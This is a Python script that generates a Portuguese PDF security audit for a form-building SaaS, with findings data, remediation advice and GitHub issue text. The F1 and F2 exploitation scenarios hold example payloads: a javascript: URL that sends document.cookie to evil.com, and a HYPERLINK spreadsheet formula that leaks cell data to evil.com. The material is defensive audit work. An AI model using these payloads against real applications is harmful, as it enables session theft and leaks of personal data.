#!/usr/bin/env python3
"""
Gera o relatório de auditoria de segurança em PDF para formularios.ia.br.
Rode com: docs/security-audit/venv/bin/python docs/security-audit/gerar_relatorio.py
"""
import os
import matplotlib
matplotlib.use("Agg")
import matplotlib.pyplot as plt
from reportlab.lib.pagesizes import A4
from reportlab.lib.units import cm
from reportlab.lib import colors
from reportlab.lib.styles import ParagraphStyle
from reportlab.lib.enums import TA_LEFT, TA_CENTER, TA_JUSTIFY
from reportlab.platypus import (
    SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, Image,
    PageBreak, KeepTogether, HRFlowable, ListFlowable, ListItem
)
from reportlab.pdfgen import canvas as pdfcanvas

HERE = os.path.dirname(os.path.abspath(__file__))
OUT_PDF = os.path.join(HERE, "relatorio-auditoria-seguranca.pdf")
CHART_DONUT = os.path.join(HERE, "_chart_donut.png")
CHART_BAR = os.path.join(HERE, "_chart_bar.png")

SEV_COLORS = {
    "Crítica": "#B91C1C",
    "Alta": "#EA580C",
    "Média": "#D97706",
    "Baixa": "#2563EB",
    "Informativa": "#6B7280",
}
STRONG_COLOR = "#059669"

# ─────────────────────────────────────────────────────────────────────────
# Dados da auditoria
# ─────────────────────────────────────────────────────────────────────────

FINDINGS = [
    dict(
        id="F1",
        categoria="5. XSS / Inputs sem tratamento",
        severidade="Crítica",
        arquivo="src/components/dashboard/responses-section.tsx:160",
        titulo="Stored XSS via fileUrl não validado renderizado como href",
        descricao=(
            "O schema Zod que valida o corpo de POST /api/responses/submit "
            "(endpoint público, sem autenticação) aceita qualquer string para "
            "answer.fileUrl (src/lib/submit-response-core.ts:25: "
            "z.object({ fileUrl: z.string(), fileName: z.string() })), sem "
            ".url() nem checagem de protocolo. O servidor nunca confirma que "
            "fileUrl veio de fato do endpoint de upload real "
            "(/api/upload/response-file) — um respondente pode enviar o "
            "payload diretamente. Esse valor depois é injetado sem sanitização "
            "em &lt;a href={file.fileUrl}&gt; na tela de respostas do dono do "
            "formulário, mesmo havendo no projeto uma função isSafeUrl() "
            "(src/lib/utils/safe-url.ts) feita exatamente pra este caso e "
            "usada em outros lugares — só não foi aplicada aqui."
        ),
        evidencia=(
            "// src/lib/submit-response-core.ts:25\n"
            "z.object({ fileUrl: z.string(), fileName: z.string() })\n\n"
            "// src/components/dashboard/responses-section.tsx:159-161\n"
            "{file.fileUrl ? (\n"
            "  <a href={file.fileUrl} target=\"_blank\" rel=\"noopener noreferrer\">\n"
            "    {file.fileName}\n"
            "  </a>\n"
            ") : ( file.fileName )}"
        ),
        exploracao=(
            "Um atacante anônimo responde a qualquer formulário publicado com "
            "campo de upload, enviando manualmente ao endpoint público "
            "/api/responses/submit um answer com "
            "fileUrl: \"javascript:fetch('https://evil.com/roubo?c='+document.cookie)\" "
            "(ou uma data: URL com HTML/script embutido). Quando o dono do "
            "formulário abre a tela de Respostas e clica no anexo, o "
            "javascript: executa no contexto autenticado dele — permitindo "
            "roubo de sessão ou disparo de Server Actions em nome do dono. "
            "Não exige nenhuma pré-condição além de o form estar publicado "
            "com um campo de upload."
        ),
        correcao=(
            "Validar fileUrl com z.string().url() mais whitelist de protocolo "
            "(https:) e idealmente de domínio (bucket do Supabase Storage) no "
            "schema de submit-response-core.ts; e aplicar isSafeUrl(file.fileUrl) "
            "antes de renderizar o href em responses-section.tsx, caindo para "
            "texto puro (sem link) quando a URL não for segura."
        ),
    ),
    dict(
        id="F2",
        categoria="Achado adicional (fora das 5 categorias, correlato a input não tratado)",
        severidade="Alta",
        arquivo="src/lib/google-sheets.ts:178-179",
        titulo="Formula Injection na integração com Google Sheets",
        descricao=(
            "Toda resposta de formulário público é anexada à planilha do dono "
            "via appendGoogleSheetsRow() usando valueInputOption: \"USER_ENTERED\". "
            "Nesse modo o Google Sheets interpreta valores que começam com "
            "=, +, - ou @ como fórmula. Os valores de resposta vêm direto do "
            "respondente (formatValue(answers[q.id])) sem nenhuma "
            "neutralização — diferente do export CSV (src/app/actions/"
            "responses.ts:76-78), que já prefixa esses caracteres com aspas "
            "simples."
        ),
        evidencia=(
            "// src/lib/google-sheets.ts:178-179\n"
            "await sheets.spreadsheets.values.append({\n"
            "  spreadsheetId, range,\n"
            "  valueInputOption: \"USER_ENTERED\",\n"
            "  requestBody: { values: [row] },\n"
            "})"
        ),
        exploracao=(
            "Atacante anônimo responde a um formulário com Google Sheets "
            "conectado usando um texto como "
            "=HYPERLINK(\"https://evil.com/steal?d=\"&A1&B1,\"Ver resultado\"). "
            "Ao abrir a planilha, o dono executa a fórmula sem saber — pode "
            "vazar dados de outras respostas (PII) para um domínio externo ou "
            "exibir um link de phishing disfarçado de dado legítimo."
        ),
        correcao=(
            "Aplicar a mesma neutralização do csvCell() antes de enviar valores "
            "ao Sheets (prefixar com ' qualquer valor que bata em "
            "/^[=+\\-@\\t\\r]/), ou trocar valueInputOption para \"RAW\" na "
            "linha de dados, mantendo USER_ENTERED só no header."
        ),
    ),
    dict(
        id="F3",
        categoria="Achado adicional (open redirect)",
        severidade="Baixa",
        arquivo="src/app/auth/callback/route.ts:21",
        titulo="Validação de next mais fraca que o helper já existente no projeto",
        descricao=(
            "O callback de OAuth valida o parâmetro next apenas com "
            "rawNext.startsWith(\"/\"), enquanto o projeto já tem um helper "
            "dedicado — isSafeNextPath() (src/lib/utils/safe-url.ts) — usado em "
            "loginAction e /api/auth/login, que rejeita explicitamente "
            "//evil.com e /\\evil.com. O callback OAuth não usa esse helper."
        ),
        evidencia=(
            "// src/app/auth/callback/route.ts:21\n"
            "const next = rawNext.startsWith(\"/\") ? rawNext : \"/dashboard\""
        ),
        exploracao=(
            "next=//evil.com ou next=/\\evil.com passa pela checagem "
            "startsWith(\"/\") e, dependendo de como o navegador normaliza o "
            "protocolo-relative, pode redirecionar para fora do domínio após "
            "o login OAuth — vetor de phishing pós-login. Impacto reduzido "
            "porque o login via Google está atualmente desabilitado na UI."
        ),
        correcao=(
            "Trocar a linha 21 para usar o helper já existente: "
            "const next = isSafeNextPath(rawNext) ? rawNext : \"/dashboard\"."
        ),
    ),
    dict(
        id="F4",
        categoria="Informativo — 1. Isolamento de tenant",
        severidade="Informativa",
        arquivo="supabase/migrations/0004_enable_rls.sql",
        titulo="Migration de RLS habilita RLS em 9 tabelas sem nenhuma policy",
        descricao=(
            "O arquivo só contém ALTER TABLE ... ENABLE ROW LEVEL SECURITY "
            "para 9 tabelas, sem nenhum CREATE POLICY. Hoje isso não tem "
            "efeito algum: toda a aplicação acessa o banco via Drizzle numa "
            "conexão direta (DATABASE_URL), não via supabase-js/PostgREST — "
            "o isolamento real de tenant é feito em código (requireFormOwner). "
            "Não é uma vulnerabilidade explorável hoje, mas se algum dia um "
            "client Supabase direto (Realtime, PostgREST) passar a acessar "
            "essas tabelas sem policies, o RLS vai negar tudo (fail-closed) — "
            "um bug funcional, não seria uma falha de segurança."
        ),
        evidencia="ALTER TABLE ... ENABLE ROW LEVEL SECURITY; (sem CREATE POLICY)",
        exploracao="Não aplicável hoje — nenhum caminho de código usa o client afetado pela RLS.",
        correcao=(
            "Documentar como pendência: antes de usar supabase-js/Realtime "
            "para essas tabelas, adicionar policies reais escopadas por "
            "workspace/usuário."
        ),
    ),
    dict(
        id="F5",
        categoria="Informativo — 2. Permissão / controle de custo",
        severidade="Informativa",
        arquivo="src/app/actions/ai.ts",
        titulo="Chamadas de IA (Gemini) sem débito de créditos ou quota",
        descricao=(
            "generateFormFromTextAction e getSemanticInsightsAction não "
            "debitam creditBalance/creditTransactions em nenhum ponto, embora "
            "essas tabelas existam no schema para esse fim. Não é uma falha "
            "de permissão (não há gate nem no client) nem uma das 5 "
            "categorias auditadas, mas é uma ausência de controle de custo: "
            "qualquer usuário autenticado pode gerar formulários/insights via "
            "Gemini sem limite, gerando custo de API sem cobrança "
            "correspondente."
        ),
        evidencia="Nenhuma chamada a creditBalance/creditTransactions em ai.ts",
        exploracao=(
            "Usuário autenticado comum chama repetidamente as Server Actions "
            "de IA, gerando custo de API do Gemini para o operador do SaaS "
            "sem consumir créditos nem esbarrar em limite algum."
        ),
        correcao=(
            "Adicionar débito de crédito (ou ao menos um rate limit por "
            "usuário/workspace) nas duas Server Actions antes de chamar a "
            "API do Gemini."
        ),
    ),
]

STRENGTHS = [
    ("1. Isolamento de tenant", "Todas as Server Actions em forms.ts, responses.ts, integrations.ts, import.ts, import-responses.ts e ai.ts chamam requireFormOwner()/requireUser() antes de tocar o banco; queries de listagem/analytics sempre ancoram o WHERE em formId ou workspaceId já validado."),
    ("1. Isolamento de tenant", "upsertQuestions() (src/lib/db/queries/questions.ts) tem defesa em profundidade explícita contra IDOR cross-tenant via upsert por ID de pergunta de outro form."),
    ("2. Permissão no servidor", "Todas as mutações privilegiadas (publicar, deletar, duplicar, integrações, brand kit) revalidam no servidor via Server Actions — nenhum gate encontrado que exista só no client."),
    ("3. IDOR", "Todos os 10 Route Handlers e as ~25 Server Actions foram percorridos individualmente; cada um que recebe um ID externo verifica posse (requireFormOwner, comparação de formId, ou path escopado ao próprio user.id)."),
    ("4. Segredos", "Nenhum segredo hardcoded no código, configs ou histórico do git; .env.example só tem placeholders; variáveis sensíveis (DATABASE_URL, SUPABASE_SERVICE_ROLE_KEY, RESEND_API_KEY, GOOGLE_CLIENT_SECRET) nunca têm fallback para valor literal; IP_HASH_SALT lança erro em produção se ausente (LGPD)."),
    ("5. XSS", "escapeHtml() é aplicado consistentemente em todo o pipeline de e-mail (email.ts e brevo-email-html.ts); os únicos 2 usos de dangerouslySetInnerHTML no app são dados estáticos (schema JSON-LD, script fixo); nenhum eval/new Function em todo o src; export CSV já neutraliza formula injection."),
]

RECOMMENDATIONS = [
    ("P1", "Corrigir o Stored XSS via fileUrl (F1) antes do lançamento público — validar URL e protocolo no schema Zod + aplicar isSafeUrl() no render."),
    ("P1", "Corrigir Formula Injection no Google Sheets (F2) — mesma prioridade por já ter correção de referência (csvCell) pronta no próprio projeto."),
    ("P2", "Unificar a validação de next no callback OAuth (F3) usando isSafeNextPath()."),
    ("P3", "Adicionar policies reais à migration 0004 (F4) antes de qualquer uso futuro de client Supabase direto/Realtime nessas tabelas."),
    ("P3", "Adicionar controle de custo/quota nas Server Actions de IA (F5)."),
]

GITHUB_ISSUES = [
    dict(
        titulo="[Segurança] Stored XSS via fileUrl não validado em respostas de formulário",
        labels="security, critical",
        corpo=f"""### Problema
O schema Zod que valida `POST /api/responses/submit` (endpoint público, sem autenticação) aceita qualquer string em `answer.fileUrl`, sem checar protocolo ou formato de URL. Esse valor é depois renderizado diretamente em `<a href={{file.fileUrl}}>` na tela de respostas do dono do formulário, sem passar pela função `isSafeUrl()` que já existe no projeto para exatamente este propósito.

### Por que é explorável
Um respondente anônimo pode montar manualmente o corpo da requisição de submit (sem usar o fluxo real de upload) e definir `fileUrl` como `javascript:...` ou uma `data:` URL com script embutido. Quando o dono do formulário clica no anexo na lista de respostas, o script executa no contexto autenticado dele.

### Evidência
`src/lib/submit-response-core.ts:25`
```ts
z.object({{ fileUrl: z.string(), fileName: z.string() }})
```
`src/components/dashboard/responses-section.tsx:159-161`
```tsx
{{file.fileUrl ? (
  <a href={{file.fileUrl}} target="_blank" rel="noopener noreferrer">
    {{file.fileName}}
  </a>
) : (file.fileName)}}
```

### Impacto
Execução de JavaScript no contexto autenticado do dono do formulário → roubo de sessão/cookie ou disparo de Server Actions em nome dele. Explorável por qualquer respondente anônimo, sem pré-condições além de o formulário estar publicado com campo de upload.

### Sugestão de correção
1. No schema Zod, trocar `z.string()` por `z.string().url()` + whitelist de protocolo (`https:`) e, se possível, de domínio (bucket do Supabase Storage).
2. Antes de renderizar o `href` em `responses-section.tsx`, chamar `isSafeUrl(file.fileUrl)` e cair para texto puro (sem link) quando falhar.

### Critérios de aceite
- [ ] `submit-response-core.ts` rejeita `fileUrl` que não seja uma URL HTTPS válida
- [ ] `responses-section.tsx` nunca renderiza um `href` que falhe em `isSafeUrl()`
- [ ] Teste automatizado cobrindo submissão com `fileUrl: "javascript:..."` sendo rejeitada ou neutralizada
- [ ] Teste automatizado cobrindo `fileUrl` legítimo (URL do Storage) continuando a funcionar
""",
    ),
    dict(
        titulo="[Segurança] Formula Injection na integração com Google Sheets",
        labels="security, high",
        corpo=f"""### Problema
`appendGoogleSheetsRow()` anexa respostas de formulário à planilha do dono usando `valueInputOption: "USER_ENTERED"`, que faz o Google Sheets interpretar valores começando com `=`, `+`, `-` ou `@` como fórmula. Os valores vêm direto do respondente, sem neutralização — diferente do export CSV, que já trata esse caso.

### Por que é explorável
Um respondente anônimo de um formulário com Google Sheets conectado envia uma resposta como `=HYPERLINK("https://evil.com/steal?d="&A1&B1,"Ver resultado")`. Ao abrir a planilha, o dono executa a fórmula sem saber, podendo vazar dados de outras respostas ou ser exposto a um link de phishing.

### Evidência
`src/lib/google-sheets.ts:178-179`
```ts
await sheets.spreadsheets.values.append({{
  spreadsheetId, range,
  valueInputOption: "USER_ENTERED",
  requestBody: {{ values: [row] }},
}})
```
Compare com a correção já existente em `src/app/actions/responses.ts:76-78` (`csvCell`), que prefixa com `'` valores que batem em `/^[=+\\-@\\t\\r]/`.

### Impacto
Vazamento de dados de outras respostas (PII) do dono da planilha para um domínio externo, ou exposição a phishing via `HYPERLINK` disfarçado de dado legítimo.

### Sugestão de correção
Aplicar a mesma neutralização do `csvCell()` a cada valor antes de enviar ao Sheets, ou trocar `valueInputOption` para `"RAW"` na linha de dados (mantendo `USER_ENTERED` só no cabeçalho, se necessário).

### Critérios de aceite
- [ ] Um valor de resposta começando com `=`, `+`, `-`, `@`, tab ou CR chega à planilha como texto literal, não como fórmula
- [ ] Teste automatizado cobrindo esse caso
""",
    ),
    dict(
        titulo="[Segurança] Validação de next no callback OAuth mais fraca que o padrão do projeto",
        labels="security, low",
        corpo=f"""### Problema
`src/app/auth/callback/route.ts:21` valida o parâmetro `next` apenas com `rawNext.startsWith("/")`, enquanto o projeto já tem `isSafeNextPath()` (`src/lib/utils/safe-url.ts`), usado em `loginAction`/`/api/auth/login`, que rejeita explicitamente `//evil.com` e `/\\evil.com`.

### Por que é explorável
`next=//evil.com` passa pela checagem `startsWith("/")`. Dependendo de como o navegador normaliza URLs protocol-relative, isso pode redirecionar o usuário para fora do domínio logo após o login via OAuth — vetor de phishing pós-login. Impacto reduzido hoje porque o login via Google está desabilitado na UI.

### Evidência
`src/app/auth/callback/route.ts:21`
```ts
const next = rawNext.startsWith("/") ? rawNext : "/dashboard"
```

### Impacto
Open redirect pós-login OAuth, usável para phishing (impacto reduzido enquanto o login Google estiver desabilitado na UI).

### Sugestão de correção
Trocar a linha para `const next = isSafeNextPath(rawNext) ? rawNext : "/dashboard"`.

### Critérios de aceite
- [ ] `next=//evil.com` e `next=/\\evil.com` resultam em redirect para `/dashboard`
- [ ] `next=/billing?checkout=founder` continua funcionando normalmente
""",
    ),
    dict(
        titulo="[Segurança] Migration de RLS sem policies + ausência de controle de custo em IA",
        labels="security, informational",
        corpo=f"""### Problema
Dois itens informativos identificados na auditoria, agrupados por serem de baixo risco imediato:

**1. `supabase/migrations/0004_enable_rls.sql`** habilita RLS em 9 tabelas sem nenhum `CREATE POLICY`. Hoje é inofensivo (a aplicação usa Drizzle via conexão direta, não `supabase-js`/PostgREST), mas se um client Supabase direto passar a acessar essas tabelas sem policies, o RLS vai negar tudo (fail-closed).

**2. `src/app/actions/ai.ts`** — `generateFormFromTextAction` e `getSemanticInsightsAction` não debitam `creditBalance`/`creditTransactions`, apesar de essas tabelas existirem para esse fim. Qualquer usuário autenticado pode gerar chamadas Gemini sem limite.

### Impacto
1. Bug funcional futuro (não uma falha de segurança hoje) se RLS passar a ser exercitado sem policies.
2. Custo de API sem controle/cobrança correspondente.

### Sugestão de correção
1. Adicionar policies reais escopadas por workspace/usuário antes de qualquer uso futuro de client Supabase direto/Realtime nessas tabelas.
2. Adicionar débito de crédito ou rate limit por usuário/workspace nas Server Actions de IA.

### Critérios de aceite
- [ ] Documentado como pendência técnica (issue ou comentário no código) até haver uso real de client Supabase direto
- [ ] Server Actions de IA aplicam algum limite (crédito ou rate limit) por usuário/workspace
""",
    ),
]

CATEGORIES_ORDER = [
    "1. Isolamento de tenant",
    "2. Permissão definida só no client",
    "3. IDOR",
    "4. Segredos hardcoded",
    "5. XSS / inputs sem tratamento",
]

# ─────────────────────────────────────────────────────────────────────────
# Gráficos
# ─────────────────────────────────────────────────────────────────────────

def make_charts():
    sev_count = {}
    for f in FINDINGS:
        sev_count[f["severidade"]] = sev_count.get(f["severidade"], 0) + 1
    order = ["Crítica", "Alta", "Média", "Baixa", "Informativa"]
    labels = [s for s in order if s in sev_count]
    sizes = [sev_count[s] for s in labels]
    colors_list = [SEV_COLORS[s] for s in labels]

    fig, ax = plt.subplots(figsize=(4.2, 4.2), dpi=200)
    wedges, texts, autotexts = ax.pie(
        sizes, labels=labels, colors=colors_list, autopct=lambda p: f"{int(round(p*sum(sizes)/100))}",
        startangle=90, pctdistance=0.78,
        wedgeprops=dict(width=0.42, edgecolor="white", linewidth=2),
        textprops=dict(fontsize=10, color="#1F2937"),
    )
    for at in autotexts:
        at.set_color("white")
        at.set_fontweight("bold")
        at.set_fontsize(11)
    ax.set_title("Achados por severidade", fontsize=13, color="#1F2937", pad=14)
    fig.tight_layout()
    fig.savefig(CHART_DONUT, transparent=True)
    plt.close(fig)

    cat_count = {}
    cat_sev = {}
    for f in FINDINGS:
        short = f["categoria"].split("—")[-1].split(".")[0].strip() if "—" in f["categoria"] else f["categoria"]
        key = f["categoria"]
        cat_count[key] = cat_count.get(key, 0) + 1
        cat_sev[key] = f["severidade"]

    cats = list(cat_count.keys())
    short_labels = []
    for c in cats:
        c2 = c.replace("Achado adicional (fora das 5 categorias, correlato a input não tratado)", "Formula Injection\n(correlato)")
        c2 = c2.replace("Achado adicional (open redirect)", "Open redirect\n(correlato)")
        c2 = c2.replace("Informativo — ", "")
        c2 = c2.replace("5. XSS / inputs sem tratamento", "5. XSS")
        c2 = c2.replace("1. Isolamento de tenant", "1. Isolamento\nde tenant")
        c2 = c2.replace("2. Permissão / controle de custo", "2. Permissão /\ncontrole de custo")
        short_labels.append(c2)

    vals = [cat_count[c] for c in cats]
    bar_colors = [SEV_COLORS[cat_sev[c]] for c in cats]

    fig2, ax2 = plt.subplots(figsize=(7.6, 4.0), dpi=200)
    bars = ax2.bar(range(len(cats)), vals, color=bar_colors, width=0.55)
    ax2.set_xticks(range(len(cats)))
    ax2.set_xticklabels(short_labels, fontsize=8, color="#374151")
    ax2.set_ylabel("Achados", fontsize=10, color="#374151")
    ax2.set_title("Achados por categoria", fontsize=13, color="#1F2937", pad=12)
    ax2.set_yticks(range(0, max(vals) + 2))
    for spine in ["top", "right"]:
        ax2.spines[spine].set_visible(False)
    for b, v in zip(bars, vals):
        ax2.text(b.get_x() + b.get_width() / 2, v + 0.05, str(v), ha="center", fontsize=10, color="#1F2937", fontweight="bold")
    fig2.tight_layout()
    fig2.savefig(CHART_BAR, transparent=True)
    plt.close(fig2)


# ─────────────────────────────────────────────────────────────────────────
# PDF
# ─────────────────────────────────────────────────────────────────────────

def escape_code(text):
    text = text.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
    text = text.replace("\n", "<br/>").replace(" ", "&nbsp;")
    return text


def sev_chip(sev):
    color = SEV_COLORS.get(sev, "#6B7280")
    return Table(
        [[Paragraph(f'<font color="white"><b>{sev.upper()}</b></font>', ParagraphStyle("chip", fontSize=8, leading=10, alignment=TA_CENTER))]],
        colWidths=[2.6 * cm],
        style=TableStyle([
            ("BACKGROUND", (0, 0), (-1, -1), colors.HexColor(color)),
            ("TOPPADDING", (0, 0), (-1, -1), 3),
            ("BOTTOMPADDING", (0, 0), (-1, -1), 3),
            ("ALIGN", (0, 0), (-1, -1), "CENTER"),
        ]),
    )


def header_footer(canvas_obj: pdfcanvas.Canvas, doc):
    canvas_obj.saveState()
    canvas_obj.setFont("Helvetica", 8)
    canvas_obj.setFillColor(colors.HexColor("#6B7280"))
    canvas_obj.drawString(2 * cm, 1.3 * cm, "Relatório de Auditoria de Segurança — formularios.ia.br")
    canvas_obj.drawRightString(A4[0] - 2 * cm, 1.3 * cm, f"Página {doc.page}")
    canvas_obj.setStrokeColor(colors.HexColor("#E5E7EB"))
    canvas_obj.line(2 * cm, 1.6 * cm, A4[0] - 2 * cm, 1.6 * cm)
    canvas_obj.restoreState()


def build_pdf():
    make_charts()

    doc = SimpleDocTemplate(
        OUT_PDF, pagesize=A4,
        leftMargin=2 * cm, rightMargin=2 * cm, topMargin=2 * cm, bottomMargin=2.2 * cm,
        title="Relatório de Auditoria de Segurança — formularios.ia.br",
    )

    styles = {
        "title": ParagraphStyle("title", fontSize=26, leading=32, fontName="Helvetica-Bold", textColor=colors.HexColor("#111827"), spaceAfter=6),
        "subtitle": ParagraphStyle("subtitle", fontSize=13, leading=18, textColor=colors.HexColor("#374151"), spaceAfter=4),
        "h1": ParagraphStyle("h1", fontSize=17, leading=22, fontName="Helvetica-Bold", textColor=colors.HexColor("#111827"), spaceBefore=18, spaceAfter=10),
        "h2": ParagraphStyle("h2", fontSize=13, leading=17, fontName="Helvetica-Bold", textColor=colors.HexColor("#1F2937"), spaceBefore=12, spaceAfter=6),
        "body": ParagraphStyle("body", fontSize=9.5, leading=14, alignment=TA_JUSTIFY, textColor=colors.HexColor("#1F2937")),
        "small": ParagraphStyle("small", fontSize=8.5, leading=12, textColor=colors.HexColor("#4B5563")),
        "code": ParagraphStyle("code", fontName="Courier", fontSize=7.6, leading=10.5, textColor=colors.HexColor("#111827"), backColor=colors.HexColor("#F3F4F6"), borderPadding=6, leftIndent=2, spaceAfter=6),
        "label": ParagraphStyle("label", fontSize=9, leading=13, fontName="Helvetica-Bold", textColor=colors.HexColor("#111827")),
        "file": ParagraphStyle("file", fontName="Courier", fontSize=9, textColor=colors.HexColor("#B91C1C")),
    }

    story = []

    # ── Capa ──────────────────────────────────────────────────────────
    story.append(Spacer(1, 3 * cm))
    story.append(Paragraph("Relatório de Auditoria de Segurança", styles["title"]))
    story.append(Paragraph("formularios.ia.br", ParagraphStyle("proj", fontSize=20, leading=26, textColor=colors.HexColor("#B91C1C"), fontName="Helvetica-Bold", spaceAfter=16)))
    story.append(Spacer(1, 0.6 * cm))
    story.append(Paragraph("Data: 29 de agosto de 2026", styles["subtitle"]))
    story.append(Paragraph(
        "Escopo: código-fonte completo do repositório (Server Actions, Route Handlers, "
        "queries de banco, componentes React, configuração de deploy e build).",
        styles["subtitle"]))
    story.append(Spacer(1, 1 * cm))
    story.append(HRFlowable(width="100%", color=colors.HexColor("#E5E7EB")))
    story.append(Spacer(1, 0.6 * cm))
    story.append(Paragraph("Nota metodológica — stack detectada e mapeamento das categorias", styles["h2"]))
    story.append(Paragraph(
        "Stack: Next.js 16 (App Router) + React 19 + TypeScript strict · Supabase (PostgreSQL) "
        "acessado via Drizzle ORM sobre conexão direta (não PostgREST/supabase-js) · Auth: "
        "Supabase Auth (e-mail + Google OAuth) · Zod para validação de fronteira · Resend "
        "(e-mail) · Google Gemini e googleapis (Sheets) · Deploy: Vercel, sem Docker/CI/Helm/"
        "Terraform no repositório.",
        styles["body"]))
    story.append(Spacer(1, 0.3 * cm))
    mapping = [
        ("Banco sem tranca", "Não há RLS em uso efetivo (dados trafegam por Drizzle, não PostgREST). O mecanismo real de isolamento de tenant é o par requireFormOwner()/requireUser() em src/lib/auth.ts, chamado no início de cada Server Action/Route Handler que toca dados de formulário."),
        ("Permissão no navegador", "Mapeado para: gates de UI por role/plano (isAdmin-equivalente, plano do usuário) vs. revalidação da mesma regra nas Server Actions correspondentes."),
        ("IDOR", "Mapeado 1:1 — toda Server Action e Route Handler que recebe um ID (formId, responseId, questionId, integration id) percorridos individualmente."),
        ("Chaves expostas", "Busca por segredos no código-fonte, .env.example, configs de build (next.config.mjs, drizzle.config.ts, package.json) e no histórico completo do git (sem Docker/CI/Helm/Terraform a verificar)."),
        ("XSS", "Mapeado para: dangerouslySetInnerHTML, href/src com valor de usuário, eval/new Function no frontend; e escapeHtml em HTML de e-mail/webhook no backend."),
    ]
    rows = [[Paragraph(f"<b>{a}</b>", styles["small"]), Paragraph(b, styles["small"])] for a, b in mapping]
    t = Table(rows, colWidths=[4.2 * cm, 12.3 * cm])
    t.setStyle(TableStyle([
        ("VALIGN", (0, 0), (-1, -1), "TOP"),
        ("GRID", (0, 0), (-1, -1), 0.5, colors.HexColor("#E5E7EB")),
        ("BACKGROUND", (0, 0), (0, -1), colors.HexColor("#F9FAFB")),
        ("TOPPADDING", (0, 0), (-1, -1), 6),
        ("BOTTOMPADDING", (0, 0), (-1, -1), 6),
        ("LEFTPADDING", (0, 0), (-1, -1), 8),
    ]))
    story.append(t)
    story.append(PageBreak())

    # ── Resumo executivo ─────────────────────────────────────────────
    story.append(Paragraph("Resumo executivo", styles["h1"]))
    sev_count = {}
    for f in FINDINGS:
        sev_count[f["severidade"]] = sev_count.get(f["severidade"], 0) + 1
    order = ["Crítica", "Alta", "Média", "Baixa", "Informativa"]
    summary_row = [s for s in order if s in sev_count]
    header_cells = [Paragraph(f'<font color="white"><b>{s}</b></font>', ParagraphStyle("h", alignment=TA_CENTER, fontSize=9, textColor=colors.white)) for s in summary_row]
    value_cells = [Paragraph(f'<b>{sev_count[s]}</b>', ParagraphStyle("v", alignment=TA_CENTER, fontSize=14)) for s in summary_row]
    sumtab = Table([header_cells, value_cells], colWidths=[3.2 * cm] * len(summary_row))
    sumtab.setStyle(TableStyle([
        ("BACKGROUND", (0, 0), (-1, 0), colors.HexColor("#111827")),
        *[("BACKGROUND", (i, 0), (i, 0), colors.HexColor(SEV_COLORS[s])) for i, s in enumerate(summary_row)],
        ("GRID", (0, 0), (-1, -1), 0.5, colors.HexColor("#E5E7EB")),
        ("TOPPADDING", (0, 0), (-1, -1), 8),
        ("BOTTOMPADDING", (0, 0), (-1, -1), 8),
        ("ALIGN", (0, 0), (-1, -1), "CENTER"),
    ]))
    story.append(sumtab)
    story.append(Spacer(1, 0.5 * cm))
    story.append(Paragraph(
        f"Total de {len(FINDINGS)} achados registrados nesta auditoria, cobrindo as cinco "
        "categorias solicitadas (isolamento de tenant, permissão no cliente, IDOR, segredos "
        "hardcoded e XSS), com dois achados adicionais correlatos encontrados durante a "
        "varredura. O achado mais grave é um Stored XSS explorável por respondente anônimo, "
        "sem necessidade de conta — recomenda-se correção antes do lançamento público.",
        styles["body"]))
    story.append(Spacer(1, 0.4 * cm))

    charts_row = Table(
        [[Image(CHART_DONUT, width=7.2 * cm, height=7.2 * cm), Image(CHART_BAR, width=8.6 * cm, height=4.6 * cm)]],
        colWidths=[7.6 * cm, 8.8 * cm],
    )
    charts_row.setStyle(TableStyle([("VALIGN", (0, 0), (-1, -1), "MIDDLE")]))
    story.append(charts_row)
    story.append(PageBreak())

    # ── Pontos fortes / fracos ────────────────────────────────────────
    story.append(Paragraph("Pontos fortes", styles["h1"]))
    for cat, ev in STRENGTHS:
        story.append(KeepTogether([
            Table([[Paragraph(f"<b>{cat}</b>", styles["label"])]], colWidths=[16.5 * cm],
                  style=TableStyle([("BACKGROUND", (0, 0), (-1, -1), colors.HexColor("#ECFDF5")),
                                     ("LEFTPADDING", (0, 0), (-1, -1), 8), ("TOPPADDING", (0, 0), (-1, -1), 5),
                                     ("BOTTOMPADDING", (0, 0), (-1, -1), 2)]),
                  ),
            Paragraph(ev, styles["body"]),
            Spacer(1, 0.25 * cm),
        ]))

    story.append(Paragraph("Pontos fracos (riscos centrais)", styles["h1"]))
    for f in FINDINGS:
        story.append(Table(
            [[sev_chip(f["severidade"]), Paragraph(f"<b>{f['titulo']}</b> — <font face='Courier' size=8>{f['arquivo']}</font>", styles["small"])]],
            colWidths=[3 * cm, 13.5 * cm],
            style=TableStyle([("VALIGN", (0, 0), (-1, -1), "MIDDLE"), ("BOTTOMPADDING", (0, 0), (-1, -1), 6)]),
        ))
    story.append(PageBreak())

    # ── Tabela de achados detalhados ──────────────────────────────────
    story.append(Paragraph("Achados detalhados", styles["h1"]))
    table_rows = [[
        Paragraph("<b>Severidade</b>", styles["small"]),
        Paragraph("<b>Arquivo:linha</b>", styles["small"]),
        Paragraph("<b>Descrição</b>", styles["small"]),
    ]]
    for f in FINDINGS:
        table_rows.append([
            sev_chip(f["severidade"]),
            Paragraph(f["arquivo"], styles["file"]),
            Paragraph(f"<b>{f['titulo']}</b><br/>{f['descricao']}", styles["small"]),
        ])
    det = Table(table_rows, colWidths=[2.7 * cm, 4.3 * cm, 9.5 * cm], repeatRows=1)
    det.setStyle(TableStyle([
        ("BACKGROUND", (0, 0), (-1, 0), colors.HexColor("#111827")),
        ("TEXTCOLOR", (0, 0), (-1, 0), colors.white),
        ("VALIGN", (0, 0), (-1, -1), "TOP"),
        ("GRID", (0, 0), (-1, -1), 0.5, colors.HexColor("#E5E7EB")),
        ("ROWBACKGROUNDS", (0, 1), (-1, -1), [colors.white, colors.HexColor("#F9FAFB")]),
        ("TOPPADDING", (0, 0), (-1, -1), 6),
        ("BOTTOMPADDING", (0, 0), (-1, -1), 6),
        ("LEFTPADDING", (0, 0), (-1, -1), 6),
    ]))
    story.append(det)
    story.append(PageBreak())

    # ── Detalhe completo por achado (evidência + exploração + correção) ──
    story.append(Paragraph("Evidências e cenários de exploração", styles["h1"]))
    for f in FINDINGS:
        block = [
            Table([[sev_chip(f["severidade"]), Paragraph(f"<b>{f['id']} — {f['titulo']}</b>", styles["h2"])]],
                  colWidths=[2.6 * cm, 13.9 * cm],
                  style=TableStyle([("VALIGN", (0, 0), (-1, -1), "MIDDLE")])),
            Paragraph(f"<i>{f['categoria']}</i> · <font face='Courier'>{f['arquivo']}</font>", styles["small"]),
